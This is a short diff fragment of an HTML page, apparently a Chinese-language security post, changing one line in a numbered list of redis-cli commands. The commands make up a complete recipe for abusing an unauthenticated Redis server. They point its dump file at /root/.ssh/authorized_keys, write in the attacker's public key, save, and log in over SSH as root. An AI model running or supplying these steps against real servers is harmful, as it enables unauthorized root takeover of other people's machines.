@@ -201,7 +201,7 @@
 1. redis-cli -h 123.123.123.123 -p 6379<br />
 2. config set dbfilename authorized_keys<br />
 3. config set dir &ldquo;/root/.ssh&rdquo;<br />
-4. set aa &ldquo;\n\n\$content\n\n\n&rdquo; 其中content 为~/.ssh/id_rsa.pub的字符串<br />
+4. set aa &ldquo;\n\n\n$content\n\n\n&rdquo; 其中content 为~/.ssh/id_rsa.pub的字符串<br />
 5. save<br />
 6. ssh root@123.123.123.123</p>
 
